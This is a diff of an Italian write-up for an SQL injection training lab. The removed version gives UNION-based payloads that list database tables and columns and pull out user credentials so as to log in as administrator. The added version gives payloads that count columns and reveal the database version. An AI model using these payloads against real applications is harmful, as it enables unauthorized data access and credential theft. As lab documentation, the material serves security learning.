@@ -1,54 +1,40 @@
-Lab: SQL injection attack, listing the database contents on non-Oracle databases
+Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
+
 
 📝 Descrizione
 
-Il lab contiene una SQL injection nel filtro della categoria dei prodotti.  
-L'obiettivo è sfruttare un attacco UNION per elencare tabelle e colonne del database, recuperare username e password degli utenti e infine effettuare l'accesso come **administrator**.
+Il lab presenta una vulnerabilità di SQL injection nel filtro della categoria prodotti.  
+L'obiettivo è eseguire un attacco UNION per estrarre e visualizzare la versione del database.
 
 ---
 
 ⚙️ Passaggi eseguiti
 
 1. Intercettata la richiesta con Burp Suite sul parametro `category`.
-2. Verificata la vulnerabilità e il numero di colonne:
+2. Verificata la vulnerabilità con un apice `'` iniettato manualmente.
+3. Testato il numero di colonne con:
 
-' UNION SELECT 'a','b'--
+' UNION SELECT NULL,NULL--
 
-3. Elencate le tabelle del database:
+4. Verificato che entrambe le colonne accettano dati testuali con:
 
-' UNION SELECT table_name,NULL FROM information_schema.tables--
+' UNION SELECT 'abc','def'--
 
-Individuata la tabella degli utenti (es. `users_xxxx`).
+5. Inserita una funzione per ottenere la versione del DB:
 
-4. Recuperati i nomi delle colonne:
-
-' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_xxxx'--
-
-Identificate le colonne `username_xxxx` e `password_xxxx`.
-
-5. Estratti i dati degli utenti:
-
-' UNION SELECT username_xxxx,password_xxxx FROM users_xxxx--
-
-6. Trovata la password dell'utente `administrator`, usata per effettuare il login.
+' UNION SELECT @@version,NULL--
 
 ---
 
 🧠 Ragionamento tecnico
- 
-Il lab richiede una SQL injection di tipo **UNION-based** per elencare metadati del database (`information_schema`) e accedere ai dati reali.  
-Si sfrutta il fatto che i risultati delle query sono visibili direttamente nella risposta HTML.
+
+L'iniezione sfrutta un'istruzione `UNION SELECT` per unire una query controllata all'output della query principale.  
+È stato necessario trovare il numero corretto di colonne e assicurarsi che una colonna mostri dati testuali.
 
 ---
 
 ✅ Soluzione finale
 
-**Payload finali usati:**
+Payload utilizzato:' UNION SELECT @@version,NULL--
 
-- Trova tabelle:' UNION SELECT table_name,NULL FROM information_schema.tables--
-
-- Trova colonne:' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_xxxx'--
-
-- Estrai credenziali:' UNION SELECT username_xxxx,password_xxxx FROM users_xxxx--
-
-Login con utente `administrator` completato con successo ✅
+Una volta eseguito, la versione del database viene mostrata nella pagina, completando il lab.
